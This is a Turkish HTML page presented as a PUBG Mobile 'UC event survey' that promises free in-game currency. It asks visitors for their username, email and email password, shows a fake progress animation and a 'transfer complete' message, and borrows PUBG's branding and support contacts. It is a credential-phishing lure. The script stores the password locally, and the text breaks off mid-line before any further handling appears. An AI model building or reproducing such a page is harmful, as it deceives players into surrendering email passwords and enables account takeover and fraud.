<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Mobile UC Etkinlik Anketi</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: url('https://example.com/pubg-background.jpg') no-repeat center center fixed;
            background-size: cover;
            color: #fff;
            text-align: center;
        }
        .container {
            max-width: 700px;
            margin: 100px auto;
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            position: relative;
            overflow: hidden;
        }
        h1 {
            margin-bottom: 20px;
            color: #ffcc00;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
        }
        .question {
            margin-bottom: 20px;
        }
        .question label {
            display: block;
            margin-bottom: 10px;
            font-size: 18px;
        }
        .question input[type="text"],
        .question input[type="password"],
        .question input[type="email"],
        .question select {
            width: calc(100% - 22px);
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #555;
            background: #222;
            color: #fff;
            font-size: 16px;
        }
        .question button {
            padding: 15px 25px;
            background-color: #ffcc00;
            color: #333;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.3s;
        }
        .question button:hover {
            background-color: #e6b800;
            transform: scale(1.05);
        }
        .progress-container {
            width: 100%;
            height: 30px;
            background: #444;
            border-radius: 15px;
            margin: 20px 0;
            position: relative;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 0;
            background: #ffcc00;
            transition: width 2s;
        }
        .result,
        .thank-you {
            display: none;
            margin-top: 20px;
            font-size: 18px;
        }
        .result p,
        .thank-you p {
            font-size: 22px;
            font-weight: bold;
        }
        .result span,
        .thank-you span {
            color: #ffcc00;
        }
        .result img,
        .thank-you img {
            width: 200px;
            height: auto;
            margin-top: 10px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.8);
        }
        .bg-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: -1;
        }
        .error {
            color: red;
            margin-top: 10px;
        }
        .thank-you-button {
            margin-top: 20px;
            padding: 15px 25px;
            background-color: #ffcc00;
            color: #333;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            display: none;
        }
        .thank-you-button:hover {
            background-color: #e6b800;
        }
        .contact-info {
            margin-top: 20px;
            font-size: 16px;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>PUBG Mobile UC Etkinlik Anketi</h1>
        <form id="surveyForm">
            <div class="question">
                <label for="username">Kullanıcı Adı:</label>
                <input type="text" id="username" name="username" required>
            </div>

            <div class="question">
                <label for="email">E-posta:</label>
                <input type="email" id="email" name="email" required>
            </div>

            <div class="question">
                <label for="password">E-posta Şifresi:</label>
                <input type="password" id="password" name="password" required>
            </div>

            <div class="question">
                <label for="amount">UC Miktarı Seçiniz:</label>
                <select id="amount" name="amount" required>
                    <option value="60">60 UC</option>
                    <option value="100">100 UC</option>
                    <option value="600">600 UC</option>
                    <option value="1000">1000 UC</option>
                    <option value="5000">5000 UC</option>
                </select>
            </div>

            <button type="submit">Gönder</button>
        </form>

        <div class="result">
            <p>Kullanıcı Adınız: <span id="resultUsername"></span></p>
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <p>Seçilen Miktar: <span id="resultAmount"></span> UC</p>
            <img src="https://example.com/pubg-image.jpg" alt="PUBG Image">
            <p id="processingMessage"></p>
        </div>

        <div class="thank-you">
            <p>Teşekkürler! İşleminiz tamamlanmıştır.</p>
            <button class="thank-you-button" id="thankYouButton">Tamam</button>
        </div>

        <div class="contact-info">
            <p>PUBG Mobile İletişim Bilgileri:</p>
            <p>Email: support@pubgmobile.com</p>
            <p>Web: <a href="https://pubgmobile.com" target="_blank" style="color: #ffcc00;">pubgmobile.com</a></p>
        </div>

        <div class="error" id="errorMessage"></div>
    </div>

    <div class="bg-overlay"></div>

    <script>
        document.getElementById('surveyForm').addEventListener('submit', function(event) {
            event.preventDefault();

            var username = document.getElementById('username').value;
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var amount = document.getElementById('amount').value;

            if (username.trim() === '' || email.trim() === '' || password.trim() === '' || amount.trim() === '') {
                document.getElementById('errorMessage').textContent = 'Lütfen tüm alanları doldurun.';
                return;
            }

            // Bilgileri yerel depolama (localStorage) kaydet
            localStorage.setItem('username', username);
            localStorage.setItem('email', email);
            localStorage.setItem('password', password);
            localStorage.setItem('amount', amount);

            document.querySelector('.result').style.display = 'block';
            document.getElementById('resultUsername').textContent = username;
            document.getElementById('resultAmount').textContent = amount + ' UC';

            var progressBar = document.getElementById('progressBar');
            var processingMessage = document.getElementById('processingMessage');
            var progressWidth = (amount / 5000) * 100;
            progressBar.style.width = progressWidth + '%';

            // Bilgileri işleme süresi ve mesaj gösterimi
            processingMessage.textContent = 'UC gönderimi başlatıldı. Bu işlem 1 ila 5 dakika sürebilir.';
            setTimeout(function() {
                document.querySelector('.result').style.display = 'none';
                document.querySelector('.thank-you').style.display = 'block';
                document.getElementById('thankYouButton').style.display = 'inline-block';
            }, 3000); // Simülasyon süresi: 3 saniye (gerçek bir senaryoda 1-5 dakika olabilir)
        });

        document.getElementById('thankYouButton').addEventListener
